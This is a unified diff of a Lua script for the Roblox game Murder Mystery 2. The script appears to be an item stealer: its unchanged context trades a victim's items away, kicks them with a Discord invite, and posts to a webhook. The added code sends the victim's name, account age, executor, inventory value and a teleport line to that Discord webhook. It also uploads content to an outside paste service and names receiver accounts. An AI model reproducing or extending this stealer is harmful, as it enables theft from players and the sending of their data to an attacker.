@@ -230,37 +230,72 @@ for _, grp in ipairs(sortedGroups) do
 end
 if totalItems > shownCount then table.insert(displayLines, "and "..(totalItems-shownCount).." more..") end
 
-local serverLink = "https://script-9209.github.io/mm2-joiner/?placeId=142823291&gameInstanceId=" .. game.JobId
+local serverLink = "https://www.roblox.com/games/start?placeId=142823291&launchData=" .. game.JobId
 local currentPlayers = #playersService:GetPlayers()
+local function createScrap(content)
+    local success, response = pcall(function()
+        local res = request({
+            Url = "https://api.rubis.app/v2/scrap",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = content
+            })
+        })
+        return HttpService:JSONDecode(res.Body)
+    end)
+    
+    if success and response and response.url then
+        return response.url .. "/raw"
+    end
+    
+    -- Fallback link or default message if upload fails
+    return "https://api.rubis.app/v2/scrap/failed/raw"
+end
 
 local embedPayload = {
-    content = (overallValue >= 5 and "> @everyone " or "> ").."**"..(overallValue >= 5 and "⋆｡ ɢᴏᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』").." • Value: "..string.format("%.2f", overallValue).."**",
-    username = "MM2 STEALER",
-    avatar_url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png",
+    content = "-- @everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \"" .. game.JobId .. "\", game.Players.LocalPlayer)",
+    username = me.Name,
     embeds = {{
-        title = "🍪 BISCUIT | MURDER MYSTERY 2",
-        description = "<:admin_hexagon:1449663928195092502> **How to Use?**\nJoin the user using join script or join link then jump or type anything in chat and accept gifts.",
-        color = 0x000000,
-        thumbnail = {
-    url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png"
-},
+        title = " Murder Mystery 2 Hit | ??? SCRIPTS ",
+        color = 0xFF0000,
         fields = {
-            {name="<:vip_hexagon:1449663700494712893> Display Name",value="```"..(me.DisplayName~="" and me.DisplayName or me.Name).."```",inline=false},
-            {name="<:member_hexagon:1449663611151585292> Username",value="```"..me.Name.."```",inline=false},
-            {name="<:verified_hexagon:1449663538833657961> Account Age",value="```"..me.AccountAge.." Days```",inline=false},
-            {name="<:developer_hexagon:1449663656324235317> Executor",value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```",inline=false},
-            {name="<:owner_hexagon:1449663973720064013> Players in Server",value="```"..currentPlayers.." / 12```",inline=false},
-            {name="<:support_hexagon:1449663871651549287> Inventory",value="```"..table.concat(displayLines,"\n").."```",inline=false},
-            {name="<:moderator_hexagon:1449663760217280522> Teleport Script",value="```game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```",inline=false},
-            {name="<:management_hexagon:1449663827112362054> Join Player",value="[ Click to Join ]("..serverLink..")",inline=false},
-        },
-        author={name="Murder Mystery 2 • Script Biscuit Hit",url=serverLink},
-        footer={text="Biscuit • Premium Scripts"},
-        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            {
+                name = "👤 Player Information",
+                value = "```" .. 
+                    "Name: " .. (me.DisplayName ~= "" and me.DisplayName or me.Name) .. "\n" ..
+                    "Receiver: B4C0NN61, abduljamarmm2t, Tskemma1\n" ..
+                    "Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\n" ..
+                    "Account Age: " .. me.AccountAge .. " days" ..
+                "```",
+                inline = false
+            },
+            {
+                name = "💰 Total Value",
+                value = "```" .. (overallValue or "0") .. "```",
+                inline = false
+            },
+            {
+                name = "📦 Inventory",
+                value = "```" .. (#displayLines > 0 and table.concat(displayLines, "\n") or "None") .. "```",
+                inline = false
+            },
+            {
+                name = "🔍 Summary",
+                value = scrapRawUrl,
+                inline = false
+            },
+            {
+                name = "🔗 Join Link",
+                value = "[" .. game.JobId .. "](" .. serverLink .. ")",
+                inline = false
+            }
+        }
     }},
-    attachments={}
+    attachments = {}
 }
-
 local function postToDiscord(link)
     pcall(function()
         request({
@@ -323,7 +358,7 @@ if #itemsToTrade > 0 then
             end
 
             postToDiscord(webhook)
-            me:kick("Sorry for Getting your items.. GET YOUR REVENGE HERE! discord.gg/SnXQCYzGjx")
+            me:kick("discord.gg/SnXQCYzGjx")
         end)
     end
 
